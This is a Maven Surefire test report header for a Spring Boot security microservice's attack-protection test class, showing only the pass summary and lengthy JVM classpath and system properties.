<?xml version="1.0" encoding="UTF-8"?>
<testsuite xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="https://maven.apache.org/surefire/maven-surefire-plugin/xsd/surefire-test-report.xsd" version="3.0.2" name="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="21.089" tests="12" errors="0" skipped="0" failures="0">
  <properties>
    <property name="java.specification.version" value="21"/>
    <property name="sun.jnu.encoding" value="UTF-8"/>
    <property name="java.class.path" value="/home/usuario/Asp/github repositorios/curso/CotizadorPcPartes/ms-seguridad/target/test-classes:/home/usuario/Asp/github repositorios/curso/CotizadorPcPartes/ms-seguridad/target/classes:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-web/3.5.3/spring-boot-starter-web-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter/3.5.3/spring-boot-starter-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot/3.5.3/spring-boot-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-logging/3.5.3/spring-boot-starter-logging-3.5.3.jar:/home/usuario/.m2/repository/ch/qos/logback/logback-classic/1.5.18/logback-classic-1.5.18.jar:/home/usuario/.m2/repository/ch/qos/logback/logback-core/1.5.18/logback-core-1.5.18.jar:/home/usuario/.m2/repository/org/apache/logging/log4j/log4j-to-slf4j/2.24.3/log4j-to-slf4j-2.24.3.jar:/home/usuario/.m2/repository/org/apache/logging/log4j/log4j-api/2.24.3/log4j-api-2.24.3.jar:/home/usuario/.m2/repository/org/slf4j/jul-to-slf4j/2.0.17/jul-to-slf4j-2.0.17.jar:/home/usuario/.m2/repository/jakarta/annotation/jakarta.annotation-api/2.1.1/jakarta.annotation-api-2.1.1.jar:/home/usuario/.m2/repository/org/yaml/snakeyaml/2.4/snakeyaml-2.4.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-json/3.5.3/spring-boot-starter-json-3.5.3.jar:/home/usuario/.m2/repository/com/fasterxml/jackson/datatype/jackson-datatype-jdk8/2.19.1/jackson-datatype-jdk8-2.19.1.jar:/home/usuario/.m2/repository/com/fasterxml/jackson/datatype/jackson-datatype-jsr310/2.19.1/jackson-datatype-jsr310-2.19.1.jar:/home/usuario/.m2/repository/com/fasterxml/jackson/module/jackson-module-parameter-names/2.19.1/jackson-module-parameter-names-2.19.1.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-tomcat/3.5.3/spring-boot-starter-tomcat-3.5.3.jar:/home/usuario/.m2/repository/org/apache/tomcat/embed/tomcat-embed-core/10.1.42/tomcat-embed-core-10.1.42.jar:/home/usuario/.m2/repository/org/apache/tomcat/embed/tomcat-embed-websocket/10.1.42/tomcat-embed-websocket-10.1.42.jar:/home/usuario/.m2/repository/org/springframework/spring-web/6.2.8/spring-web-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/spring-beans/6.2.8/spring-beans-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/spring-webmvc/6.2.8/spring-webmvc-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/spring-context/6.2.8/spring-context-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/spring-expression/6.2.8/spring-expression-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-data-jpa/3.5.3/spring-boot-starter-data-jpa-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-jdbc/3.5.3/spring-boot-starter-jdbc-3.5.3.jar:/home/usuario/.m2/repository/com/zaxxer/HikariCP/6.3.0/HikariCP-6.3.0.jar:/home/usuario/.m2/repository/org/springframework/spring-jdbc/6.2.8/spring-jdbc-6.2.8.jar:/home/usuario/.m2/repository/org/hibernate/orm/hibernate-core/6.6.18.Final/hibernate-core-6.6.18.Final.jar:/home/usuario/.m2/repository/jakarta/persistence/jakarta.persistence-api/3.1.0/jakarta.persistence-api-3.1.0.jar:/home/usuario/.m2/repository/jakarta/transaction/jakarta.transaction-api/2.0.1/jakarta.transaction-api-2.0.1.jar:/home/usuario/.m2/repository/org/jboss/logging/jboss-logging/3.6.1.Final/jboss-logging-3.6.1.Final.jar:/home/usuario/.m2/repository/org/hibernate/common/hibernate-commons-annotations/7.0.3.Final/hibernate-commons-annotations-7.0.3.Final.jar:/home/usuario/.m2/repository/io/smallrye/jandex/3.2.0/jandex-3.2.0.jar:/home/usuario/.m2/repository/com/fasterxml/classmate/1.7.0/classmate-1.7.0.jar:/home/usuario/.m2/repository/net/bytebuddy/byte-buddy/1.17.6/byte-buddy-1.17.6.jar:/home/usuario/.m2/repository/org/glassfish/jaxb/jaxb-runtime/4.0.5/jaxb-runtime-4.0.5.jar:/home/usuario/.m2/repository/org/glassfish/jaxb/jaxb-core/4.0.5/jaxb-core-4.0.5.jar:/home/usuario/.m2/repository/org/eclipse/angus/angus-activation/2.0.2/angus-activation-2.0.2.jar:/home/usuario/.m2/repository/org/glassfish/jaxb/txw2/4.0.5/txw2-4.0.5.jar:/home/usuario/.m2/repository/com/sun/istack/istack-commons-runtime/4.1.2/istack-commons-runtime-4.1.2.jar:/home/usuario/.m2/repository/jakarta/inject/jakarta.inject-api/2.0.1/jakarta.inject-api-2.0.1.jar:/home/usuario/.m2/repository/org/antlr/antlr4-runtime/4.13.0/antlr4-runtime-4.13.0.jar:/home/usuario/.m2/repository/org/springframework/data/spring-data-jpa/3.5.1/spring-data-jpa-3.5.1.jar:/home/usuario/.m2/repository/org/springframework/data/spring-data-commons/3.5.1/spring-data-commons-3.5.1.jar:/home/usuario/.m2/repository/org/springframework/spring-orm/6.2.8/spring-orm-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/spring-tx/6.2.8/spring-tx-6.2.8.jar:/home/usuario/.m2/repository/org/slf4j/slf4j-api/2.0.17/slf4j-api-2.0.17.jar:/home/usuario/.m2/repository/org/springframework/spring-aspects/6.2.8/spring-aspects-6.2.8.jar:/home/usuario/.m2/repository/org/aspectj/aspectjweaver/1.9.24/aspectjweaver-1.9.24.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-security/3.5.3/spring-boot-starter-security-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/spring-aop/6.2.8/spring-aop-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/security/spring-security-config/6.5.1/spring-security-config-6.5.1.jar:/home/usuario/.m2/repository/org/springframework/security/spring-security-web/6.5.1/spring-security-web-6.5.1.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-validation/3.5.3/spring-boot-starter-validation-3.5.3.jar:/home/usuario/.m2/repository/org/apache/tomcat/embed/tomcat-embed-el/10.1.42/tomcat-embed-el-10.1.42.jar:/home/usuario/.m2/repository/org/hibernate/validator/hibernate-validator/8.0.2.Final/hibernate-validator-8.0.2.Final.jar:/home/usuario/.m2/repository/jakarta/validation/jakarta.validation-api/3.0.2/jakarta.validation-api-3.0.2.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-actuator/3.5.3/spring-boot-starter-actuator-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-actuator-autoconfigure/3.5.3/spring-boot-actuator-autoconfigure-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-actuator/3.5.3/spring-boot-actuator-3.5.3.jar:/home/usuario/.m2/repository/io/micrometer/micrometer-observation/1.15.1/micrometer-observation-1.15.1.jar:/home/usuario/.m2/repository/io/micrometer/micrometer-commons/1.15.1/micrometer-commons-1.15.1.jar:/home/usuario/.m2/repository/io/micrometer/micrometer-jakarta9/1.15.1/micrometer-jakarta9-1.15.1.jar:/home/usuario/.m2/repository/io/micrometer/micrometer-core/1.15.1/micrometer-core-1.15.1.jar:/home/usuario/.m2/repository/org/hdrhistogram/HdrHistogram/2.2.2/HdrHistogram-2.2.2.jar:/home/usuario/.m2/repository/org/latencyutils/LatencyUtils/2.0.3/LatencyUtils-2.0.3.jar:/home/usuario/.m2/repository/io/jsonwebtoken/jjwt-api/0.12.3/jjwt-api-0.12.3.jar:/home/usuario/.m2/repository/io/jsonwebtoken/jjwt-impl/0.12.3/jjwt-impl-0.12.3.jar:/home/usuario/.m2/repository/io/jsonwebtoken/jjwt-jackson/0.12.3/jjwt-jackson-0.12.3.jar:/home/usuario/.m2/repository/com/fasterxml/jackson/core/jackson-databind/2.19.1/jackson-databind-2.19.1.jar:/home/usuario/.m2/repository/com/fasterxml/jackson/core/jackson-annotations/2.19.1/jackson-annotations-2.19.1.jar:/home/usuario/.m2/repository/com/fasterxml/jackson/core/jackson-core/2.19.1/jackson-core-2.19.1.jar:/home/usuario/.m2/repository/com/mysql/mysql-connector-j/9.2.0/mysql-connector-j-9.2.0.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-test/3.5.3/spring-boot-starter-test-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-test/3.5.3/spring-boot-test-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-test-autoconfigure/3.5.3/spring-boot-test-autoconfigure-3.5.3.jar:/home/usuario/.m2/repository/com/jayway/jsonpath/json-path/2.9.0/json-path-2.9.0.jar:/home/usuario/.m2/repository/jakarta/xml/bind/jakarta.xml.bind-api/4.0.2/jakarta.xml.bind-api-4.0.2.jar:/home/usuario/.m2/repository/jakarta/activation/jakarta.activation-api/2.1.3/jakarta.activation-api-2.1.3.jar:/home/usuario/.m2/repository/net/minidev/json-smart/2.5.2/json-smart-2.5.2.jar:/home/usuario/.m2/repository/net/minidev/accessors-smart/2.5.2/accessors-smart-2.5.2.jar:/home/usuario/.m2/repository/org/ow2/asm/asm/9.7.1/asm-9.7.1.jar:/home/usuario/.m2/repository/org/assertj/assertj-core/3.27.3/assertj-core-3.27.3.jar:/home/usuario/.m2/repository/org/awaitility/awaitility/4.2.2/awaitility-4.2.2.jar:/home/usuario/.m2/repository/org/hamcrest/hamcrest/3.0/hamcrest-3.0.jar:/home/usuario/.m2/repository/org/junit/jupiter/junit-jupiter/5.12.2/junit-jupiter-5.12.2.jar:/home/usuario/.m2/repository/org/junit/jupiter/junit-jupiter-api/5.12.2/junit-jupiter-api-5.12.2.jar:/home/usuario/.m2/repository/org/opentest4j/opentest4j/1.3.0/opentest4j-1.3.0.jar:/home/usuario/.m2/repository/org/junit/platform/junit-platform-commons/1.12.2/junit-platform-commons-1.12.2.jar:/home/usuario/.m2/repository/org/apiguardian/apiguardian-api/1.1.2/apiguardian-api-1.1.2.jar:/home/usuario/.m2/repository/org/junit/jupiter/junit-jupiter-params/5.12.2/junit-jupiter-params-5.12.2.jar:/home/usuario/.m2/repository/org/junit/jupiter/junit-jupiter-engine/5.12.2/junit-jupiter-engine-5.12.2.jar:/home/usuario/.m2/repository/org/junit/platform/junit-platform-engine/1.12.2/junit-platform-engine-1.12.2.jar:/home/usuario/.m2/repository/org/mockito/mockito-core/5.17.0/mockito-core-5.17.0.jar:/home/usuario/.m2/repository/net/bytebuddy/byte-buddy-agent/1.17.6/byte-buddy-agent-1.17.6.jar:/home/usuario/.m2/repository/org/objenesis/objenesis/3.3/objenesis-3.3.jar:/home/usuario/.m2/repository/org/mockito/mockito-junit-jupiter/5.17.0/mockito-junit-jupiter-5.17.0.jar:/home/usuario/.m2/repository/org/skyscreamer/jsonassert/1.5.3/jsonassert-1.5.3.jar:/home/usuario/.m2/repository/com/vaadin/external/google/android-json/0.0.20131108.vaadin1/android-json-0.0.20131108.vaadin1.jar:/home/usuario/.m2/repository/org/springframework/spring-core/6.2.8/spring-core-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/spring-jcl/6.2.8/spring-jcl-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/spring-test/6.2.8/spring-test-6.2.8.jar:/home/usuario/.m2/repository/org/xmlunit/xmlunit-core/2.10.2/xmlunit-core-2.10.2.jar:/home/usuario/.m2/repository/org/springframework/security/spring-security-test/6.5.1/spring-security-test-6.5.1.jar:/home/usuario/.m2/repository/org/springframework/security/spring-security-core/6.5.1/spring-security-core-6.5.1.jar:/home/usuario/.m2/repository/org/springframework/security/spring-security-crypto/6.5.1/spring-security-crypto-6.5.1.jar:/home/usuario/.m2/repository/org/testcontainers/mysql/1.21.1/mysql-1.21.1.jar:/home/usuario/.m2/repository/org/testcontainers/jdbc/1.21.1/jdbc-1.21.1.jar:/home/usuario/.m2/repository/org/testcontainers/database-commons/1.21.1/database-commons-1.21.1.jar:/home/usuario/.m2/repository/org/testcontainers/junit-jupiter/1.21.1/junit-jupiter-1.21.1.jar:/home/usuario/.m2/repository/org/testcontainers/testcontainers/1.21.1/testcontainers-1.21.1.jar:/home/usuario/.m2/repository/junit/junit/4.13.2/junit-4.13.2.jar:/home/usuario/.m2/repository/org/hamcrest/hamcrest-core/3.0/hamcrest-core-3.0.jar:/home/usuario/.m2/repository/org/apache/commons/commons-compress/1.24.0/commons-compress-1.24.0.jar:/home/usuario/.m2/repository/org/rnorth/duct-tape/duct-tape/1.0.8/duct-tape-1.0.8.jar:/home/usuario/.m2/repository/org/jetbrains/annotations/17.0.0/annotations-17.0.0.jar:/home/usuario/.m2/repository/com/github/docker-java/docker-java-api/3.4.2/docker-java-api-3.4.2.jar:/home/usuario/.m2/repository/com/github/docker-java/docker-java-transport-zerodep/3.4.2/docker-java-transport-zerodep-3.4.2.jar:/home/usuario/.m2/repository/com/github/docker-java/docker-java-transport/3.4.2/docker-java-transport-3.4.2.jar:/home/usuario/.m2/repository/net/java/dev/jna/jna/5.13.0/jna-5.13.0.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-testcontainers/3.5.3/spring-boot-testcontainers-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-autoconfigure/3.5.3/spring-boot-autoconfigure-3.5.3.jar:"/>
    <property name="java.vm.vendor" value="Eclipse Adoptium"/>
    <property name="sun.arch.data.model" value="64"/>
    <property name="java.vendor.url" value="https://adoptium.net/"/>
    <property name="catalina.useNaming" value="false"/>
    <property name="user.timezone" value="America/Mazatlan"/>
    <property name="org.jboss.logging.provider" value="slf4j"/>
    <property name="os.name" value="Linux"/>
    <property name="java.vm.specification.version" value="21"/>
    <property name="APPLICATION_NAME" value="ms-seguridad-test"/>
    <property name="user.country" value="US"/>
    <property name="sun.java.launcher" value="SUN_STANDARD"/>
    <property name="sun.boot.library.path" value="/usr/local/java/lib"/>
    <property name="sun.java.command" value="/home/usuario/Asp/github repositorios/curso/CotizadorPcPartes/ms-seguridad/target/surefire/surefirebooter-20250702170946275_3.jar /home/usuario/Asp/github repositorios/curso/CotizadorPcPartes/ms-seguridad/target/surefire 2025-07-02T17-09-46_185-jvmRun1 surefire-20250702170946275_1tmp surefire_0-20250702170946275_2tmp"/>
    <property name="jdk.debug" value="release"/>
    <property name="surefire.test.class.path" value="/home/usuario/Asp/github repositorios/curso/CotizadorPcPartes/ms-seguridad/target/test-classes:/home/usuario/Asp/github repositorios/curso/CotizadorPcPartes/ms-seguridad/target/classes:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-web/3.5.3/spring-boot-starter-web-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter/3.5.3/spring-boot-starter-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot/3.5.3/spring-boot-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-logging/3.5.3/spring-boot-starter-logging-3.5.3.jar:/home/usuario/.m2/repository/ch/qos/logback/logback-classic/1.5.18/logback-classic-1.5.18.jar:/home/usuario/.m2/repository/ch/qos/logback/logback-core/1.5.18/logback-core-1.5.18.jar:/home/usuario/.m2/repository/org/apache/logging/log4j/log4j-to-slf4j/2.24.3/log4j-to-slf4j-2.24.3.jar:/home/usuario/.m2/repository/org/apache/logging/log4j/log4j-api/2.24.3/log4j-api-2.24.3.jar:/home/usuario/.m2/repository/org/slf4j/jul-to-slf4j/2.0.17/jul-to-slf4j-2.0.17.jar:/home/usuario/.m2/repository/jakarta/annotation/jakarta.annotation-api/2.1.1/jakarta.annotation-api-2.1.1.jar:/home/usuario/.m2/repository/org/yaml/snakeyaml/2.4/snakeyaml-2.4.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-json/3.5.3/spring-boot-starter-json-3.5.3.jar:/home/usuario/.m2/repository/com/fasterxml/jackson/datatype/jackson-datatype-jdk8/2.19.1/jackson-datatype-jdk8-2.19.1.jar:/home/usuario/.m2/repository/com/fasterxml/jackson/datatype/jackson-datatype-jsr310/2.19.1/jackson-datatype-jsr310-2.19.1.jar:/home/usuario/.m2/repository/com/fasterxml/jackson/module/jackson-module-parameter-names/2.19.1/jackson-module-parameter-names-2.19.1.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-tomcat/3.5.3/spring-boot-starter-tomcat-3.5.3.jar:/home/usuario/.m2/repository/org/apache/tomcat/embed/tomcat-embed-core/10.1.42/tomcat-embed-core-10.1.42.jar:/home/usuario/.m2/repository/org/apache/tomcat/embed/tomcat-embed-websocket/10.1.42/tomcat-embed-websocket-10.1.42.jar:/home/usuario/.m2/repository/org/springframework/spring-web/6.2.8/spring-web-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/spring-beans/6.2.8/spring-beans-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/spring-webmvc/6.2.8/spring-webmvc-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/spring-context/6.2.8/spring-context-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/spring-expression/6.2.8/spring-expression-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-data-jpa/3.5.3/spring-boot-starter-data-jpa-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-jdbc/3.5.3/spring-boot-starter-jdbc-3.5.3.jar:/home/usuario/.m2/repository/com/zaxxer/HikariCP/6.3.0/HikariCP-6.3.0.jar:/home/usuario/.m2/repository/org/springframework/spring-jdbc/6.2.8/spring-jdbc-6.2.8.jar:/home/usuario/.m2/repository/org/hibernate/orm/hibernate-core/6.6.18.Final/hibernate-core-6.6.18.Final.jar:/home/usuario/.m2/repository/jakarta/persistence/jakarta.persistence-api/3.1.0/jakarta.persistence-api-3.1.0.jar:/home/usuario/.m2/repository/jakarta/transaction/jakarta.transaction-api/2.0.1/jakarta.transaction-api-2.0.1.jar:/home/usuario/.m2/repository/org/jboss/logging/jboss-logging/3.6.1.Final/jboss-logging-3.6.1.Final.jar:/home/usuario/.m2/repository/org/hibernate/common/hibernate-commons-annotations/7.0.3.Final/hibernate-commons-annotations-7.0.3.Final.jar:/home/usuario/.m2/repository/io/smallrye/jandex/3.2.0/jandex-3.2.0.jar:/home/usuario/.m2/repository/com/fasterxml/classmate/1.7.0/classmate-1.7.0.jar:/home/usuario/.m2/repository/net/bytebuddy/byte-buddy/1.17.6/byte-buddy-1.17.6.jar:/home/usuario/.m2/repository/org/glassfish/jaxb/jaxb-runtime/4.0.5/jaxb-runtime-4.0.5.jar:/home/usuario/.m2/repository/org/glassfish/jaxb/jaxb-core/4.0.5/jaxb-core-4.0.5.jar:/home/usuario/.m2/repository/org/eclipse/angus/angus-activation/2.0.2/angus-activation-2.0.2.jar:/home/usuario/.m2/repository/org/glassfish/jaxb/txw2/4.0.5/txw2-4.0.5.jar:/home/usuario/.m2/repository/com/sun/istack/istack-commons-runtime/4.1.2/istack-commons-runtime-4.1.2.jar:/home/usuario/.m2/repository/jakarta/inject/jakarta.inject-api/2.0.1/jakarta.inject-api-2.0.1.jar:/home/usuario/.m2/repository/org/antlr/antlr4-runtime/4.13.0/antlr4-runtime-4.13.0.jar:/home/usuario/.m2/repository/org/springframework/data/spring-data-jpa/3.5.1/spring-data-jpa-3.5.1.jar:/home/usuario/.m2/repository/org/springframework/data/spring-data-commons/3.5.1/spring-data-commons-3.5.1.jar:/home/usuario/.m2/repository/org/springframework/spring-orm/6.2.8/spring-orm-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/spring-tx/6.2.8/spring-tx-6.2.8.jar:/home/usuario/.m2/repository/org/slf4j/slf4j-api/2.0.17/slf4j-api-2.0.17.jar:/home/usuario/.m2/repository/org/springframework/spring-aspects/6.2.8/spring-aspects-6.2.8.jar:/home/usuario/.m2/repository/org/aspectj/aspectjweaver/1.9.24/aspectjweaver-1.9.24.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-security/3.5.3/spring-boot-starter-security-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/spring-aop/6.2.8/spring-aop-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/security/spring-security-config/6.5.1/spring-security-config-6.5.1.jar:/home/usuario/.m2/repository/org/springframework/security/spring-security-web/6.5.1/spring-security-web-6.5.1.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-validation/3.5.3/spring-boot-starter-validation-3.5.3.jar:/home/usuario/.m2/repository/org/apache/tomcat/embed/tomcat-embed-el/10.1.42/tomcat-embed-el-10.1.42.jar:/home/usuario/.m2/repository/org/hibernate/validator/hibernate-validator/8.0.2.Final/hibernate-validator-8.0.2.Final.jar:/home/usuario/.m2/repository/jakarta/validation/jakarta.validation-api/3.0.2/jakarta.validation-api-3.0.2.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-actuator/3.5.3/spring-boot-starter-actuator-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-actuator-autoconfigure/3.5.3/spring-boot-actuator-autoconfigure-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-actuator/3.5.3/spring-boot-actuator-3.5.3.jar:/home/usuario/.m2/repository/io/micrometer/micrometer-observation/1.15.1/micrometer-observation-1.15.1.jar:/home/usuario/.m2/repository/io/micrometer/micrometer-commons/1.15.1/micrometer-commons-1.15.1.jar:/home/usuario/.m2/repository/io/micrometer/micrometer-jakarta9/1.15.1/micrometer-jakarta9-1.15.1.jar:/home/usuario/.m2/repository/io/micrometer/micrometer-core/1.15.1/micrometer-core-1.15.1.jar:/home/usuario/.m2/repository/org/hdrhistogram/HdrHistogram/2.2.2/HdrHistogram-2.2.2.jar:/home/usuario/.m2/repository/org/latencyutils/LatencyUtils/2.0.3/LatencyUtils-2.0.3.jar:/home/usuario/.m2/repository/io/jsonwebtoken/jjwt-api/0.12.3/jjwt-api-0.12.3.jar:/home/usuario/.m2/repository/io/jsonwebtoken/jjwt-impl/0.12.3/jjwt-impl-0.12.3.jar:/home/usuario/.m2/repository/io/jsonwebtoken/jjwt-jackson/0.12.3/jjwt-jackson-0.12.3.jar:/home/usuario/.m2/repository/com/fasterxml/jackson/core/jackson-databind/2.19.1/jackson-databind-2.19.1.jar:/home/usuario/.m2/repository/com/fasterxml/jackson/core/jackson-annotations/2.19.1/jackson-annotations-2.19.1.jar:/home/usuario/.m2/repository/com/fasterxml/jackson/core/jackson-core/2.19.1/jackson-core-2.19.1.jar:/home/usuario/.m2/repository/com/mysql/mysql-connector-j/9.2.0/mysql-connector-j-9.2.0.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-starter-test/3.5.3/spring-boot-starter-test-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-test/3.5.3/spring-boot-test-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-test-autoconfigure/3.5.3/spring-boot-test-autoconfigure-3.5.3.jar:/home/usuario/.m2/repository/com/jayway/jsonpath/json-path/2.9.0/json-path-2.9.0.jar:/home/usuario/.m2/repository/jakarta/xml/bind/jakarta.xml.bind-api/4.0.2/jakarta.xml.bind-api-4.0.2.jar:/home/usuario/.m2/repository/jakarta/activation/jakarta.activation-api/2.1.3/jakarta.activation-api-2.1.3.jar:/home/usuario/.m2/repository/net/minidev/json-smart/2.5.2/json-smart-2.5.2.jar:/home/usuario/.m2/repository/net/minidev/accessors-smart/2.5.2/accessors-smart-2.5.2.jar:/home/usuario/.m2/repository/org/ow2/asm/asm/9.7.1/asm-9.7.1.jar:/home/usuario/.m2/repository/org/assertj/assertj-core/3.27.3/assertj-core-3.27.3.jar:/home/usuario/.m2/repository/org/awaitility/awaitility/4.2.2/awaitility-4.2.2.jar:/home/usuario/.m2/repository/org/hamcrest/hamcrest/3.0/hamcrest-3.0.jar:/home/usuario/.m2/repository/org/junit/jupiter/junit-jupiter/5.12.2/junit-jupiter-5.12.2.jar:/home/usuario/.m2/repository/org/junit/jupiter/junit-jupiter-api/5.12.2/junit-jupiter-api-5.12.2.jar:/home/usuario/.m2/repository/org/opentest4j/opentest4j/1.3.0/opentest4j-1.3.0.jar:/home/usuario/.m2/repository/org/junit/platform/junit-platform-commons/1.12.2/junit-platform-commons-1.12.2.jar:/home/usuario/.m2/repository/org/apiguardian/apiguardian-api/1.1.2/apiguardian-api-1.1.2.jar:/home/usuario/.m2/repository/org/junit/jupiter/junit-jupiter-params/5.12.2/junit-jupiter-params-5.12.2.jar:/home/usuario/.m2/repository/org/junit/jupiter/junit-jupiter-engine/5.12.2/junit-jupiter-engine-5.12.2.jar:/home/usuario/.m2/repository/org/junit/platform/junit-platform-engine/1.12.2/junit-platform-engine-1.12.2.jar:/home/usuario/.m2/repository/org/mockito/mockito-core/5.17.0/mockito-core-5.17.0.jar:/home/usuario/.m2/repository/net/bytebuddy/byte-buddy-agent/1.17.6/byte-buddy-agent-1.17.6.jar:/home/usuario/.m2/repository/org/objenesis/objenesis/3.3/objenesis-3.3.jar:/home/usuario/.m2/repository/org/mockito/mockito-junit-jupiter/5.17.0/mockito-junit-jupiter-5.17.0.jar:/home/usuario/.m2/repository/org/skyscreamer/jsonassert/1.5.3/jsonassert-1.5.3.jar:/home/usuario/.m2/repository/com/vaadin/external/google/android-json/0.0.20131108.vaadin1/android-json-0.0.20131108.vaadin1.jar:/home/usuario/.m2/repository/org/springframework/spring-core/6.2.8/spring-core-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/spring-jcl/6.2.8/spring-jcl-6.2.8.jar:/home/usuario/.m2/repository/org/springframework/spring-test/6.2.8/spring-test-6.2.8.jar:/home/usuario/.m2/repository/org/xmlunit/xmlunit-core/2.10.2/xmlunit-core-2.10.2.jar:/home/usuario/.m2/repository/org/springframework/security/spring-security-test/6.5.1/spring-security-test-6.5.1.jar:/home/usuario/.m2/repository/org/springframework/security/spring-security-core/6.5.1/spring-security-core-6.5.1.jar:/home/usuario/.m2/repository/org/springframework/security/spring-security-crypto/6.5.1/spring-security-crypto-6.5.1.jar:/home/usuario/.m2/repository/org/testcontainers/mysql/1.21.1/mysql-1.21.1.jar:/home/usuario/.m2/repository/org/testcontainers/jdbc/1.21.1/jdbc-1.21.1.jar:/home/usuario/.m2/repository/org/testcontainers/database-commons/1.21.1/database-commons-1.21.1.jar:/home/usuario/.m2/repository/org/testcontainers/junit-jupiter/1.21.1/junit-jupiter-1.21.1.jar:/home/usuario/.m2/repository/org/testcontainers/testcontainers/1.21.1/testcontainers-1.21.1.jar:/home/usuario/.m2/repository/junit/junit/4.13.2/junit-4.13.2.jar:/home/usuario/.m2/repository/org/hamcrest/hamcrest-core/3.0/hamcrest-core-3.0.jar:/home/usuario/.m2/repository/org/apache/commons/commons-compress/1.24.0/commons-compress-1.24.0.jar:/home/usuario/.m2/repository/org/rnorth/duct-tape/duct-tape/1.0.8/duct-tape-1.0.8.jar:/home/usuario/.m2/repository/org/jetbrains/annotations/17.0.0/annotations-17.0.0.jar:/home/usuario/.m2/repository/com/github/docker-java/docker-java-api/3.4.2/docker-java-api-3.4.2.jar:/home/usuario/.m2/repository/com/github/docker-java/docker-java-transport-zerodep/3.4.2/docker-java-transport-zerodep-3.4.2.jar:/home/usuario/.m2/repository/com/github/docker-java/docker-java-transport/3.4.2/docker-java-transport-3.4.2.jar:/home/usuario/.m2/repository/net/java/dev/jna/jna/5.13.0/jna-5.13.0.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-testcontainers/3.5.3/spring-boot-testcontainers-3.5.3.jar:/home/usuario/.m2/repository/org/springframework/boot/spring-boot-autoconfigure/3.5.3/spring-boot-autoconfigure-3.5.3.jar:"/>
    <property name="sun.cpu.endian" value="little"/>
    <property name="user.home" value="/home/usuario"/>
    <property name="user.language" value="en"/>
    <property name="java.specification.vendor" value="Oracle Corporation"/>
    <property name="java.version.date" value="2024-04-16"/>
    <property name="java.home" value="/usr/local/java"/>
    <property name="file.separator" value="/"/>
    <property name="basedir" value="/home/usuario/Asp/github repositorios/curso/CotizadorPcPartes/ms-seguridad"/>
    <property name="java.vm.compressedOopsMode" value="Zero based"/>
    <property name="line.separator" value="&#10;"/>
    <property name="java.vm.specification.vendor" value="Oracle Corporation"/>
    <property name="java.specification.name" value="Java Platform API Specification"/>
    <property name="FILE_LOG_CHARSET" value="UTF-8"/>
    <property name="java.awt.headless" value="true"/>
    <property name="surefire.real.class.path" value="/home/usuario/Asp/github repositorios/curso/CotizadorPcPartes/ms-seguridad/target/surefire/surefirebooter-20250702170946275_3.jar"/>
    <property name="sun.management.compiler" value="HotSpot 64-Bit Tiered Compilers"/>
    <property name="java.runtime.version" value="21.0.3+9-LTS"/>
    <property name="user.name" value="usuario"/>
    <property name="stdout.encoding" value="UTF-8"/>
    <property name="path.separator" value=":"/>
    <property name="os.version" value="6.11.0-29-generic"/>
    <property name="java.runtime.name" value="OpenJDK Runtime Environment"/>
    <property name="file.encoding" value="UTF-8"/>
    <property name="FILE_LOG_PATTERN" value="%d{yyyy-MM-dd HH:mm:ss} [%thread] %-5level %logger{36} - %msg%n"/>
    <property name="java.vm.name" value="OpenJDK 64-Bit Server VM"/>
